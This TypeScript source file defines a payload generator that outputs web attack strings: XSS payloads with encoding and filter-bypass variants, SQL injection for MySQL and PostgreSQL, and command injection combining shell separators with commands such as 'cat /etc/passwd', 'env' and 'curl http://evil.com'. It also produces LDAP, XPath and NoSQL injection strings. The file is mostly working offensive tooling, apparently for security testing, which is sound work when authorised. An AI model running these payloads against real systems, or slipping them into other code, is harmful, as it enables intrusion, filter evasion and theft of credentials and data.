export class PayloadGenerator {
  async generateXSSPayloads(
    context: 'html' | 'attribute' | 'javascript' | 'css',
    encoding?: string,
    filters?: string[],
  ): Promise<string[]> {
    const basePayloads = this.getXSSBasePayloads(context);
    let payloads = [...basePayloads];

    // Apply encoding if specified
    if (encoding) {
      payloads = payloads.concat(this.applyEncoding(basePayloads, encoding));
    }

    // Generate filter bypass payloads
    if (filters && filters.length > 0) {
      payloads = payloads.concat(this.generateFilterBypasses(basePayloads, filters));
    }

    return [...new Set(payloads)]; // Remove duplicates
  }

  async generateSQLiPayloads(
    dbType: 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite',
    technique: 'union' | 'boolean' | 'time' | 'error',
    prefix?: string,
    suffix?: string,
  ): Promise<string[]> {
    const basePayloads = this.getSQLiBasePayloads(dbType, technique);

    return basePayloads.map(payload => {
      let finalPayload = payload;
      if (prefix) finalPayload = prefix + finalPayload;
      if (suffix) finalPayload = finalPayload + suffix;
      return finalPayload;
    });
  }

  async generateCommandInjectionPayloads(
    os: 'linux' | 'windows' | 'generic' = 'linux',
    separators?: string[],
  ): Promise<string[]> {
    const baseSeparators = separators || ['&', '|', ';', '&&', '||', '\n', '`'];
    const commands = this.getCommandsByOS(os);
    const payloads: string[] = [];

    for (const separator of baseSeparators) {
      for (const command of commands) {
        payloads.push(`${separator} ${command}`);
        payloads.push(`${separator}${command}`);
        payloads.push(`test${separator}${command}`);
      }
    }

    return payloads;
  }

  async generateLDAPInjectionPayloads(): Promise<string[]> {
    return [
      '*',
      '*)',
      '*)(',
      '*))%00',
      '*(|(mail=*))',
      '*(|(objectclass=*))',
      '*)(uid=*))(|(uid=*',
      '*)(|(cn=*))',
      '*)(|(sn=*))',
      '*)(&(objectclass=user)(cn=*))',
      '*)(|(userPassword=*))',
      '*)(&(objectclass=*)(uid=admin))',
      '*)(|(mail=admin*))',
      '*)(&(objectclass=*)(|(uid=*)(cn=*)))',
      "*()|%26'",
      '*))%00',
      '*))(|(objectclass=*',
      '*(|(mail=*)(mail=*))',
    ];
  }

  async generateXPathInjectionPayloads(): Promise<string[]> {
    return [
      "' or '1'='1",
      "' or 1=1 or ''='",
      "x' or 1=1 or 'x'='y",
      "' or 'a'='a",
      "'] | //user/*['",
      "'] | //node()['",
      "' or position()=1 or '",
      "' or contains(name,'admin') or '",
      "' or text()='password' or '",
      "' or substring(name(),1,1)='a' or '",
      "' or normalize-space()='test' or '",
    ];
  }

  async generateNoSQLInjectionPayloads(): Promise<string[]> {
    return [
      // MongoDB
      '{\"$ne\": null}',
      '{\"$ne\": \"\"}',
      '{\"$gt\": \"\"}',
      '{\"$regex\": \".*\"}',
      '{\"$exists\": true}',
      '{\"$where\": \"this.username == this.username\"}',
      '{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}]}',

      // CouchDB
      '{\"selector\": {\"_id\": {\"$gt\": null}}}',

      // General
      'true',
      'false',
      '1',
      '0',
      '[]',
      '{}',
    ];
  }

  private getXSSBasePayloads(context: string): string[] {
    const payloads = {
      html: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video controls onloadstart=alert(1)><source src=x>',
        '"><script>alert(1)</script>',
        "';alert(1);//",
      ],
      attribute: [
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '\" autofocus onfocus=\"alert(1)\"',
        "' autofocus onfocus='alert(1)'",
        '" onclick="alert(1)"',
        "' onclick='alert(1)'",
        '\" style=\"x:expression(alert(1))\"',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
      ],
      javascript: [
        "';alert(1);//",
        '\";alert(1);//',
        "\\';alert(1);//",
        '\\\";alert(1);//',
        '};alert(1);//',
        '});alert(1);//',
        ');alert(1);//',
        ']=1;alert(1);//',
      ],
      css: [
        'expression(alert(1))',
        'url(javascript:alert(1))',
        'url(data:text/html,<script>alert(1)</script>)',
        '/**/expression(alert(1))',
        'url("javascript:alert(1)")',
        'behavior:url(#default#userData)',
      ],
    };

    return payloads[context as keyof typeof payloads] || payloads.html;
  }

  private getSQLiBasePayloads(dbType: string, technique: string): string[] {
    const payloads: Record<string, Record<string, string[]>> = {
      mysql: {
        union: [
          "' UNION SELECT 1,2,3--",
          "' UNION ALL SELECT NULL,NULL,NULL--",
          "' UNION SELECT user(),database(),version()--",
          "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--",
          "1' UNION SELECT 1,2,3#",
        ],
        boolean: [
          "' AND 1=1--",
          "' AND 1=2--",
          "' OR 1=1--",
          "' OR '1'='1'--",
          "1' AND '1'='1'#",
          "1' AND SUBSTRING(user(),1,1)='r'#",
        ],
        time: [
          "' AND SLEEP(5)--",
          "' OR SLEEP(5)--",
          "1' AND (SELECT SLEEP(5))#",
          "'; WAITFOR DELAY '00:00:05'--",
          "1' AND BENCHMARK(1000000,MD5(1))#",
        ],
        error: [
          "' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--",
          "' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)--",
          "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(user(),FLOOR(RAND(0)*2)))--",
        ],
      },
      postgresql: {
        union: [
          "' UNION SELECT 1,2,3--",
          "' UNION ALL SELECT NULL,NULL,NULL--",
          "' UNION SELECT user,current_database(),version()--",
          "' UNION SELECT 1,string_agg(datname,','),3 FROM pg_database--",
        ],
        boolean: ["' AND 1=1--", "' AND 1=2--", "' OR 1=1--", "' OR '1'='1'--", "1' AND SUBSTRING(user,1,1)='p'--"],
        time: ["' AND pg_sleep(5)--", "' OR pg_sleep(5)--", "1' AND (SELECT pg_sleep(5))--"],
        error: ["' AND CAST(user AS INT)--", "' AND 1=CAST(user AS INT)--", "' UNION SELECT CAST(user AS INT),2,3--"],
      },
    };

    const dbPayloads = payloads[dbType];
    if (!dbPayloads) return payloads.mysql.union;

    return dbPayloads[technique] || dbPayloads.union;
  }

  private getCommandsByOS(os: string): string[] {
    const commands = {
      linux: [
        'id',
        'whoami',
        'pwd',
        'ls',
        'cat /etc/passwd',
        'uname -a',
        'ps aux',
        'netstat -an',
        'env',
        'curl http://evil.com',
      ],
      windows: [
        'whoami',
        'dir',
        'type C:\\windows\\system.ini',
        'net user',
        'ipconfig',
        'tasklist',
        'systeminfo',
        'net view',
        'echo %USERNAME%',
        'powershell -c "Get-Process"',
      ],
      generic: ['id', 'whoami', 'dir', 'ls', 'pwd', 'echo test', 'cat /etc/passwd', 'type C:\\windows\\system.ini'],
    };

    return commands[os as keyof typeof commands] || commands.generic;
  }

  private applyEncoding(payloads: string[], encoding: string): string[] {
    const encoders = {
      url: (str: string) => encodeURIComponent(str),
      doubleurl: (str: string) => encodeURIComponent(encodeURIComponent(str)),
      html: (str: string) => str.replace(/[<>"'&]/g, char => `&#${char.charCodeAt(0)};`),
      unicode: (str: string) =>
        str
          .split('')
          .map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`)
          .join(''),
      base64: (str: string) => Buffer.from(str).toString('base64'),
      hex: (str: string) =>
        str
          .split('')
          .map(char => `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`)
          .join(''),
    };

    const encoder = encoders[encoding as keyof typeof encoders];
    if (!encoder) return payloads;

    return payloads.map(payload => encoder(payload));
  }

  private generateFilterBypasses(payloads: string[], filters: string[]): string[] {
    const bypasses: string[] = [];

    for (const payload of payloads) {
      for (const filter of filters) {
        // Case variation bypasses
        if (filter.toLowerCase() === 'script') {
          bypasses.push(payload.replace(/script/gi, 'ScRiPt'));
          bypasses.push(payload.replace(/script/gi, 'sCrIpT'));
          bypasses.push(payload.replace(/<script/gi, '<ScRiPt'));
        }

        // Comment insertion bypasses
        if (filter.includes('script')) {
          bypasses.push(payload.replace(/script/gi, 'scr/**/ipt'));
          bypasses.push(payload.replace(/script/gi, 'scr<!---->ipt'));
        }

        // Character substitution bypasses
        if (filter.includes('alert')) {
          bypasses.push(payload.replace(/alert/gi, 'prompt'));
          bypasses.push(payload.replace(/alert/gi, 'confirm'));
          bypasses.push(payload.replace(/alert/gi, 'eval'));
          bypasses.push(payload.replace(/alert\(/gi, 'window["alert"]('));
          bypasses.push(payload.replace(/alert\(/gi, 'top["alert"]('));
        }

        // Space bypasses
        if (filter.includes(' ')) {
          bypasses.push(payload.replace(/ /g, '/**/'));
          bypasses.push(payload.replace(/ /g, '%20'));
          bypasses.push(payload.replace(/ /g, '+'));
          bypasses.push(payload.replace(/ /g, '%09'));
          bypasses.push(payload.replace(/ /g, '%0a'));
          bypasses.push(payload.replace(/ /g, '%0d'));
        }
      }
    }

    return bypasses;
  }
}
